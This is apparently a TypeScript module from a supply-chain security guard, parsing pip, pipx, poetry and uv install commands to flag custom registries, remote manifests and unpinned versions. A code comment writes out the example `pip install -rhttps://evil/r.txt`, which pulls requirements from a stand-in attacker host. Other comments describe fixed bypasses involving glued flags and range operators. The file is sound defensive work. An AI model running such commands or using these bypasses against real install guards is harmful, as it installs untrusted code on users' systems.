// PyPI-family install-command parsers (pip / pip3 / pipx / poetry / uv),
// extracted from package-install-parser-ecosystems.ts to keep that module under
// the per-file line cap. Import from package-install-parser.ts (or the
// ecosystems barrel), not directly from here.
//
// Imports ONLY from package-install-parser-shared.ts — the dependency graph
// stays acyclic: shared ← pypi ← ecosystems ← package-install-parser (main).

import type {
	InstallAction,
	InstallCommand,
	PackageSpec,
} from "./package-install-parser-shared.js";

import { envRegistryFor } from "./package-install-parser-shared.js";
import { nonNull } from "../lib/non-null.js";

// ===========================================================
// pip / pip3 / pipx
// ===========================================================
interface PipFlagScan {
	positionals: string[];
	customRegistry: string | undefined;
	manifestFile: string | undefined;
	fromConstraints: boolean;
}

// `-e` / `--editable` is intentionally NOT a value-consuming flag — its value IS
// the spec, and dropping that value would let `pip install -e git+URL` slip past
// the guard. We capture the next token as a positional spec in scanPipFlags.
const PIP_FLAG_TAKES_VALUE = new Set([
	"--target",
	"-t",
	"--prefix",
	"--root",
	"--src",
	"--build",
	"--cache-dir",
	"--log",
	"--proxy",
	"--retries",
	"--timeout",
	"--exists-action",
	"--trusted-host",
	"--client-cert",
	"--cert",
	"--python",
	"--find-links",
	"-f",
	"--platform",
	"--python-version",
	"--implementation",
	"--abi",
]);

// Walk pip's post-`install` args, separating positional package specs from flags.
// Captures a custom index URL, a -r/--requirement manifest file, and whether a
// -c/--constraint was present. Editable (-e/--editable) targets are positionals.
function scanPipFlags(args: string[]): PipFlagScan {
	const positionals: string[] = [];
	let customRegistry: string | undefined;
	let manifestFile: string | undefined;
	let fromConstraints = false;

	for (let i = 0; i < args.length; i++) {
		const a = args[i];
		if (a === "--index-url" || a === "-i" || a === "--extra-index-url") {
			customRegistry = args[i + 1];
			i++;
			continue;
		}
		const m = nonNull(a).match(/^(?:--index-url|--extra-index-url|-i)=(.+)$/);
		if (m) {
			customRegistry = m[1];
			continue;
		}
		if (a === "-r" || a === "--requirement") {
			manifestFile = args[i + 1];
			i++;
			continue;
		}
		const mr = nonNull(a).match(/^--requirement=(.+)$/);
		if (mr) {
			manifestFile = mr[1];
			continue;
		}
		if (a === "-c" || a === "--constraint") {
			fromConstraints = true;
			i++;
			continue;
		}
		if (scanPipEditable(nonNull(a), args[i + 1], positionals)) {
			i++;
			continue;
		}
		const meq = nonNull(a).match(/^--editable=(.+)$/);
		if (meq) {
			positionals.push(nonNull(meq[1]));
			continue;
		}
		// ATTACHED short-option values — optparse-style pip accepts the value glued
		// to the flag: `-rreqs.txt`, `-ihttps://mirror`, `-cconstraints.txt`,
		// `-egit+URL`. Without this branch each parsed as an unknown flag and was
		// silently skipped, so `pip install -rhttps://evil/r.txt` looked like a
		// bare manifest sync and the manifest/registry/editable signals were lost —
		// the same attached-value class as the git `-mfix` finding (2026-06).
		const glued = nonNull(a).match(/^-([rice])(.+)$/);
		if (glued) {
			const value = glued[2] ?? "";
			if (glued[1] === "r") manifestFile = value;
			else if (glued[1] === "i") customRegistry = value;
			else if (glued[1] === "c") fromConstraints = true;
			else positionals.push(value); // -e<spec>: the value IS the install spec
			continue;
		}
		if (nonNull(a).startsWith("-")) {
			if (pipFlagConsumesValue(nonNull(a), args[i + 1])) i++;
			continue;
		}
		positionals.push(nonNull(a));
	}

	return { positionals, customRegistry, manifestFile, fromConstraints };
}

// True when a generic pip flag `a` takes a separate value token (and that token,
// `next`, is present and isn't itself a flag) — so the scanner should skip it.
function pipFlagConsumesValue(a: string, next: string | undefined): boolean {
	return PIP_FLAG_TAKES_VALUE.has(a) && /^[^-]/.test(next || "");
}

// Handle `-e <spec>` / `--editable <spec>`: push the following token as a
// positional when it's a real spec (not another flag / missing). Returns true
// when `a` was the editable flag (so the caller advances past the consumed spec),
// regardless of whether a spec followed.
function scanPipEditable(
	a: string,
	next: string | undefined,
	positionals: string[],
): boolean {
	if (a !== "-e" && a !== "--editable") return false;
	if (next && !next.startsWith("-")) {
		positionals.push(next);
		return true;
	}
	return false;
}

export function parsePip(
	bin: string,
	tokens: string[],
	envVars: Record<string, string>,
): InstallCommand | null {
	const sub = tokens[1] || "";
	const isPipxSubcommand =
		bin === "pipx" && (sub === "install" || sub === "inject" || sub === "run");
	if (sub !== "install" && !isPipxSubcommand) return null;
	const args = tokens.slice(2);

	const scan = scanPipFlags(args);
	// `pipx inject <venv> <pkgs…>`: the FIRST positional names the EXISTING pipx
	// environment being injected into, not a package being installed — classifying
	// it as a spec made `pipx inject black requests==2.31.0` treat `black` as an
	// unpinned package and block under exact-version enforcement (finding
	// 2026-06). Only the remaining positionals are the real injected specs.
	const positionals =
		bin === "pipx" && sub === "inject" ? scan.positionals.slice(1) : scan.positionals;
	const manifestFile = scan.manifestFile;
	const customRegistry = scan.customRegistry ?? envRegistryFor("pypi", envVars);

	const packages: PackageSpec[] = positionals.map(classifyPipSpec);
	const noPositionals = positionals.length === 0;
	let action: InstallAction = noPositionals ? "sync" : "add";
	const fromManifest = !!manifestFile || (noPositionals && !scan.fromConstraints);
	if (bin === "pipx") action = "install_global";

	return {
		ecosystem: "pypi",
		manager: bin,
		action,
		packages,
		fromLockfile: false,
		fromManifest,
		manifestFile,
		customRegistry,
		notes: [],
	};
}

export function classifyPipSpec(spec: string): PackageSpec {
	if (/^https?:\/\/.+\.(tar\.gz|whl|zip|tgz)(?:[?#].*)?$/i.test(spec))
		return { kind: "tarball_url", url: spec };
	if (/^git\+/.test(spec)) return { kind: "git_url", url: spec };
	if (spec.startsWith("file://")) return { kind: "file_url", path: spec.slice(7) };
	if (
		spec.startsWith("./") ||
		spec.startsWith("../") ||
		spec.startsWith("/") ||
		spec === "."
	)
		return { kind: "local_path", path: spec };
	const nameMatch = spec.match(/^([A-Za-z0-9._-]+)/);
	const name = nameMatch ? nonNull(nameMatch[1]) : spec;
	// RETAIN the comparison operator (finding 2026-06): storing only the numeric
	// portion let `requests~=2.31.0` / `>=2.31.0` / `!=2.31.0` reach the pin check
	// as a bare `2.31.0` and pass as an exact pin, bypassing the supply-chain
	// exact-pin guarantee for PEP 508 range syntax. With the operator kept,
	// `pinnedVersionViolation` blocks `~=`/`>=`/`<=`/`>`/`<` (RANGE_OPERATOR_RE) and
	// `!=` (fails EXACT_FULL_VERSION_RE), while `==`/`===` remain exact pins.
	const versionMatch = spec.match(/(===|==|>=|<=|~=|!=|>|<)\s*([A-Za-z0-9._+-]+)/);
	return {
		kind: "registry",
		name,
		version: versionMatch ? `${versionMatch[1]}${versionMatch[2]}` : undefined,
	};
}

// ===========================================================
// poetry
// ===========================================================
export function parsePoetry(
	tokens: string[],
	envVars: Record<string, string>,
): InstallCommand | null {
	const sub = tokens[1] || "";
	const args = tokens.slice(2);
	if (sub === "add") {
		const positionals: string[] = [];
		let customRegistry: string | undefined;
		for (let i = 0; i < args.length; i++) {
			const a = args[i];
			if (a === "--source") {
				customRegistry = args[i + 1];
				i++;
				continue;
			}
			if (nonNull(a).startsWith("-")) continue;
			positionals.push(nonNull(a));
		}
		if (!customRegistry) customRegistry = envRegistryFor("pypi", envVars);
		return {
			ecosystem: "pypi",
			manager: "poetry",
			action: "add",
			packages: positionals.map(classifyPipSpec),
			fromLockfile: false,
			fromManifest: false,
			customRegistry,
			notes: [],
		};
	}
	if (sub === "install") {
		let fromLockfile = false;
		for (const a of args) {
			if (a === "--no-update" || a === "--locked") fromLockfile = true;
		}
		return {
			ecosystem: "pypi",
			manager: "poetry",
			action: "sync",
			packages: [],
			fromLockfile,
			fromManifest: true,
			manifestFile: "pyproject.toml",
			customRegistry: envRegistryFor("pypi", envVars),
			notes: [],
		};
	}
	if (sub === "remove") {
		return {
			ecosystem: "pypi",
			manager: "poetry",
			action: "remove",
			packages: [],
			fromLockfile: false,
			fromManifest: false,
			notes: [],
		};
	}
	return null;
}

// ===========================================================
// uv
// ===========================================================
export function parseUv(
	tokens: string[],
	envVars: Record<string, string>,
): InstallCommand | null {
	const sub = tokens[1] || "";
	const args = tokens.slice(2);
	if (sub === "add") {
		const positionals = args.filter((a) => !a.startsWith("-"));
		return {
			ecosystem: "pypi",
			manager: "uv",
			action: "add",
			packages: positionals.map(classifyPipSpec),
			fromLockfile: false,
			fromManifest: false,
			customRegistry: envRegistryFor("pypi", envVars),
			notes: [],
		};
	}
	if (sub === "sync") {
		const fromLockfile = args.includes("--frozen") || args.includes("--locked");
		return {
			ecosystem: "pypi",
			manager: "uv",
			action: "sync",
			packages: [],
			fromLockfile,
			fromManifest: true,
			manifestFile: "pyproject.toml",
			customRegistry: envRegistryFor("pypi", envVars),
			notes: [],
		};
	}
	if (sub === "pip") {
		const inner = args[0] || "";
		if (inner === "install") {
			const sub2 = parsePip("pip", ["pip", ...args], envVars);
			if (sub2 && !sub2.customRegistry)
				sub2.customRegistry = envRegistryFor("pypi", envVars);
			return sub2;
		}
		return null;
	}
	if (sub === "tool") {
		const inner = args[0] || "";
		if (inner === "install") {
			const positionals = args.slice(1).filter((a) => !a.startsWith("-"));
			return {
				ecosystem: "pypi",
				manager: "uv",
				action: "install_global",
				packages: positionals.map(classifyPipSpec),
				fromLockfile: false,
				fromManifest: false,
				customRegistry: envRegistryFor("pypi", envVars),
				notes: [],
			};
		}
	}
	return null;
}
